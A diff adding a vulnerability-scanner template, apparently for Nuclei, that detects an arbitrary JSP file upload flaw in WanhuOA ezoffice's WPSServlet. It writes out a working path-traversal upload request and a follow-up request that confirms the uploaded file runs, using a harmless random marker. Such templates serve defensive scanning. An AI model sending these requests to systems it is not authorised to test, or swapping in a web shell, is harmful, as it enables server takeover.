@@ -1,0 +1,56 @@
+id: poc-wanhuoa-ezoffice-wpsservlet-file-upload
+info:
+  name: WanhuOA ezoffice WPSServlet Arbitrary File Upload
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    This template detects an arbitrary file upload vulnerability in WanhuOA ezoffice WPSServlet. The vulnerability allows an attacker to upload JSP files and execute arbitrary code.
+  tags: file-upload
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/defaultroot/wpsservlet?option=saveNewFile&newdocId={{filename}}&dir=../platform/portal/layout/&fileType=.jsp"
+    headers:
+      User-Agent: "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0"
+      Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
+      Accept-Language: "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3"
+      Accept-Encoding: "gzip, deflate"
+      DNT: "1"
+      Connection: "close"
+      Upgrade-Insecure-Requests: "1"
+      Content-Type: "multipart/form-data; boundary={{boundary}}"
+    body: |-
+      --{{boundary}}
+      Content-Disposition: form-data; name="NewFile"; filename="{{filename}}.jsp"
+
+      <% out.print("{{content}}");%>
+      --{{boundary}}--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "{{BaseURL}}/defaultroot/platform/portal/layout/{{filename}}.jsp"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{content}}"
+      - type: word
+        part: header
+        words:
+          - "text/html;charset=UTF-8"
+
+variables:
+  boundary: '{{rand_text_alphanumeric(32)}}'
+  content: '{{rand_text_alphanumeric(8)}}'
+  filename: '{{rand_text_alphanumeric(5)}}'
